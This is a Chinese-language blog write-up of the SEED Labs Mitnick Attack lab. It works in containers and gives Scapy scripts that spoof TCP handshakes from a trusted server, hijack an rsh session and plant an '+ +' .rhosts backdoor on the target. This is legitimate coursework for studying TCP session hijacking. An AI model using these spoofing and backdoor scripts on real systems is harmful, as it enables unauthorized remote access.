---
title: The-Mitnick-Attack-Lab
categories:
  - SeedLabs/NetworkSecurity
tags:
  - Mitnick Attack
  - NetworkSecurity
abbrlink: f332aa6e
date: 2024-03-24 00:26:24
---

## Overview

Kevin Mitnick 可能是美国最著名的黑客之一。他在 FBI 的通缉名单上。在逃亡期间，他开始对入侵移动电话网络感兴趣，并且需要专门的软件来帮助他做到这一点。于是，他找到了在圣地亚哥超级计算 机中心工作的研究人员 Tsutomu Shimomura，他是移动电话网络安全方面的专家。他有 Mitnick 想要的代码。 

1994 年，Mitnick 利用 TCP 协议的漏洞和 Shimomura 的两台计算机之间的可信关系，成功地对 Shimomura 的计算机发动了一次攻击。这种攻击现在被称为 Mitnick 攻击，是一种特殊类型的 TCP 会话劫持。

这个实验的目标是重现经典的 Mitnick 攻击，包括以下主题：

-   TCP 会话劫持攻击
-   TCP 三次握手
-   Mitnick 攻击
-   远程 rsh shell
-   数据包嗅探和欺骗

## How the Mitnick Attack Works

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2FkOTdiOThmZmNiODI4ODQwMWViMTEwNzYxNDViNmNfUjd6bE9oRDV5ZlE2RFk4Y09ETXhYRXNyVjFOSjBIcjVfVG9rZW46UWhycGJyajhGb2hoR0d4dlY2aWNFMEF1bldlXzE3MTEyMTEzMjM6MTcxMTIxNDkyM19WNA)

1.  第一步，序列号预测。在那个时候，seq 的值并不是随机的。Mitnick 不断给 X 发送 SYN，然后获得其 SYN+ACK 包，然后发送 RST 清除连接。获取大量的数据后分析 ACK 包中的 seq 值，发现了两个连续的 seq 之间有规律，这使得 Mitnick 能够预测 seq 值。
2.  第二步，SYN 洪泛攻击。攻击 TS，从而关闭 TS，使其完全沉默。  这样，Mitnick 伪造了一个 TS 的 SYN 包之后，尽管 SYN+ACK 包会发送给 TS，但是 TS 已经关闭了，就不会回复 RST 包对攻击造成麻烦。
3.  第三步，伪造一个 TCP 连接。Mitnick 需要伪造一个 ACK 数据包，使用其预测的序列号，完成三次握手。
4.  第四步，运行远程 shell，通过 TCP 连接，发送一个 shell 请求，请求 X 运行一个命令，这个命令是将 + + 写入 .rhosts 文件。这样，所有的 rsh 和 rlogin 请求都会被信任。

## Lab Environment Setup Using Container

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=NGY3MDc2ZDBlN2RmMGRiZjc0YTAzMjAyZjMyY2IyNmNfMWNpSWtzTGNVT1MyaVJJSGZaNmhUM09Ld2RDdXdONzBfVG9rZW46THZuaWJxM1lib1V0RlR4MGJNU2NHeGNibnNnXzE3MTEyMTEzMjM6MTcxMTIxNDkyM19WNA)

-   关于攻击者容器，共享文件夹、网络模式为主机模式（可以查看全部容器的网络流量）、特权模式（在运行时可以修改内核参数）
-   安装 rsh，rsh 和 rlogin 是不安全的，在现代的 Linux 系统中，rsh 命令是一个到 ssh 的符号链接。为了重现 Mitnick 攻击，需要在 X 和 TS 容器中安装 rsh 的不安全版本。

**Configuration**，rsh  服务器程序使用两个文件进行身份验证，.rhosts 和 /etc/hosts.equiv。.rhosts 文件必须位于用户主目录的顶层，并且只能由所有者/用户修改。将 TS 的 IP 地址放入该文件内，即可实现免密登录。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDA2YTZlZjkyZjRhNmQzNzUxYzU3ODY3ODFiZjNlZWRfVHlHeGo0VzFDWXdZNXBpdzFPaEg1SGczVU1HOTV1SklfVG9rZW46R0pWaWJnRDVqb29tSmR4MzJ0TmNZQzVzbnJoXzE3MTEyMTEzMjM6MTcxMTIxNDkyM19WNA)

第一次权限配置错了，所以连不上，配置修改正确以后，就能成功连接了。

## Task 1: Simulated SYN flooding 

在 Mitnick 攻击时期，操作系统很容易受到 SYN 洪泛攻击的影响，这种攻击可以使目标机器静音甚至关闭。然而，现代操作系统已经不会这样了，因此，我们直接停止 TS 容器模拟这种攻击。但是，直接停止 TS 容器会有一个问题，X 回复 SYN+ACK 数据包的时候，会先通过 ARP 来请求 TS 的 MAC 地址，如果没有应答，则 X 不能发送响应，TCP 连接也就无法建立。

在真正的攻击中，TS 的 MAC 地址实际上是在 X 终端的 ARP 缓存中。即使不是，在关闭 TS 之前，使用伪造 ARP 请求达到这个目的。为了简化任务，在停止 TS 之前，先从 X ping 它一次，然后检查 MAC 地址是否在缓存中。更简单的，我们直接在 X 上运行 `arp -s IP MAC` 将一个条目永久的添加到 ARP 缓存中。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGU0NWNhYTYwMTZhZDBjZjJiOTVkMjdhMmZlOGM1OTlfUTdQS2RzRWE2U3VlMWc0YllFR2pERlpkQk1hU2RiRnJfVG9rZW46RUN3VWJ6V1hUb1JXWll4MlpRRWNqVDJabnRkXzE3MTEyMTEzMjM6MTcxMTIxNDkyM19WNA)

## Task 2: Spoof TCP Connections and rsh Sessions

如今无法预测序列号了，因此，我们允许嗅探数据包，用于获取序列号。

为了了解 rsh 的行为，我们从 TS 到 X 启动一个 rsh 会话，然后用 Wireshark 捕获它们之间的数据包。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=YTIxOWZjOWVmYTM5NTAwMzM4NTE3MTNkZWJhYjk5M2FfdnNad2JSdWtIVlQzQmdpaVVEVExvTXFEQWl1UGZiQzFfVG9rZW46RjVuaWJjc2NUb045U3R4blhWaGNuRjEzbmhoXzE3MTEyMTEzMjM6MTcxMTIxNDkyM19WNA)

我们只需要关注前两个连接，第二个连接时错误输出，如果这个输出没有建立，那么命令也就不会执行。

### Task 2.1: Spoof the First TCP Connection

**Step 1，**构造第一个 SYN 数据包。

```Python
#!/usr/bin/python3
from scapy.all import *
x_ip = "10.9.0.5"  # X-Terminal
x_port = 514  # Port number used by X-Terminal
srv_ip = "10.9.0.6"  # The trusted server
srv_port = 1023  # Port number used by the trusted server
seq_num = 0x1000

ip = IP(src=srv_ip, dst=x_ip)
# 发送第一个数据包
tcp = TCP(sport=srv_port, dport=x_port, flags="S", seq=seq_num)
send(ip/tcp)
```

**Step 2，** 嗅探 SYN+ACK 响应包，拿到序列号。然后发送 ACK，建立连接，建立连接之后，发送 RSH 数据到 X 端。Rsh 数据的结构如下，由端口号、客户端用户 ID、服务器用户 ID 和命令组成。

```Python
#!/usr/bin/python3
from scapy.all import *
x_ip = "10.9.0.5"  # X-Terminal
x_port = 514  # Port number used by X-Terminal
srv_ip = "10.9.0.6"  # The trusted server
srv_port = 1023  # Port number used by the trusted server
seq_num = 0x1000

def spoof(pkt):
    global seq_num  # We will update this global variable in the function
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]
    # Print out debugging information
    tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4  # TCP data length
    print("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,
                                                  old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))
    ip = IP(src=srv_ip, dst=x_ip)
    # 发送第三个数据包
    if old_tcp.flags == "SA":
        tcp = TCP(sport=srv_port, dport=x_port,
                  flags="A", seq=seq_num+1, ack=old_tcp.seq+1)
        send(ip/tcp, verbose=0)
        # 发送第四个数据包
        data = '9090\x00seed\x00seed\x00touch /tmp/xyz\x00'
        tcp = TCP(sport=srv_port, dport=x_port,
                  flags="AP", seq=seq_num+1, ack=old_tcp.seq+1) # flags 通过抓包可知
        send(ip/tcp/data, verbose=0)

# You need to make the filter more specific
myFilter = 'tcp and ether src 02:42:0a:09:00:05'
sniff(iface='br-20bedad1acc1', filter=myFilter, prn=spoof)
```

首先，执行嗅探程序，然后发送 SYN，执行情况如下。查看 xyz 搞错了机器了，但是确实是没有执行的。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjViOWQ0Nzk0M2Y0MmVjNWVlZDNhY2NlOWNhOWNlODVfYUxMQ294aVRGMWs0SVExSm5OWktaMFhmcUJPOUtKMHNfVG9rZW46T1puMGJDbkdpb2k0Ump4eFkxMGNueDFBbnZoXzE3MTEyMTEzMjM6MTcxMTIxNDkyM19WNA)

Wireshark 抓包结果如下，前三条是三次握手，第四第五发送 Romote Shell 数据并确定，接下来 TS 向 9090 发起第二次连接，没有回应，一直在重试。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=MjYwYTA2ZjIzZGM0MDk3NDJlOTliNTA3YjJlOTg1OWRfZGRxWDVkTW9ZSHkzQ1o2WW13WFBKbE5PNWdRNjhsUTBfVG9rZW46UFJwOGJsZHk2b0xjeTd4bmFxWmNLdkNlbkRiXzE3MTEyMTEzMjM6MTcxMTIxNDkyM19WNA)

### Task 2.2: Spoof the Second TCP Connection

在代码中增加一个发送第二个连接的第二次握手，注意这里的端口其实会改变，按理来说是不能用嗅探包里面的数据的，要自己写。源端口是 9090，目的端口是 1023。

```Python
        # 发送第四个数据包
        data = '9090\x00seed\x00seed\x00touch /tmp/xyz\x00'
        tcp = TCP(sport=srv_port, dport=x_port,
                  flags="AP", seq=seq_num+1, ack=old_tcp.seq+1)
        send(ip/tcp/data, verbose=0)
# .................................................
    # 发送第二个连接的第二次握手
    if old_tcp.flags == "S" and old_tcp.dport == 9090:
        # 端口通过测试是
        tcp = TCP(sport=old_tcp.dport, dport=old_tcp.sport,
                  flags="SA", seq=seq_num, ack=old_tcp.seq+1)
        send(ip/tcp, verbose=0)
# .................................................
# You need to make the filter more specific
myFilter = 'tcp and ether src 02:42:0a:09:00:05'
sniff(iface='br-20bedad1acc1', filter=myFilter, prn=spoof)
```

运行结果如下：

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=NDRkNDg1ZGIyNWRjZjYyY2E5MWY3ZDE4MGI3ZWRkZjZfRGp3RmpaQ1NNZG9ZYUZiVGFqM1lvRmxEMkh4MGZxNVJfVG9rZW46R1hEemJHb1k4b3dxb054aWdzRmNxRDE3bnNlXzE3MTEyMTEzMjM6MTcxMTIxNDkyM19WNA)

Wireshark 截图，一切正常。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=Yjc5NjIzYzQ3MWVmODU2OGM5MWYyYjlmY2VlYzY5ZDRfSkhNSHlyZ3hUVjJUZmJ0YktNVUFIQTZtQ0VlZDF2Z3NfVG9rZW46UW1VWmJhSjJYb3BiR2x4ODBjM2Nwb1VablljXzE3MTEyMTEzMjM6MTcxMTIxNDkyM19WNA)

## Task 3: Set Up a Backdoor

将命令修改为 `echo + + > .rhosts` 即可。注意，因为没有改 ID，故 Attacker 需要切换到 seed 用户才能免密连接。

```Python
data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'
```

攻击成功。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=MTQ3Y2Q5NTJhMzFjMDJmMDEwODdmNjRiOWNkNmFjODFfbDBSMlJqV1Jka1BaUmwwTEpkekNxUUx3aGc4QlV5U2tfVG9rZW46VTQ1NmJha1pXb2h5RXF4dUpEUGNwVWxkbjRLXzE3MTEyMTEzMjM6MTcxMTIxNDkyM19WNA)

如果想全部写在一个代码里面，可能要使用多线程。否则发完 SYN 之后再嗅探，嗅探不到 SYN+ACK 包了。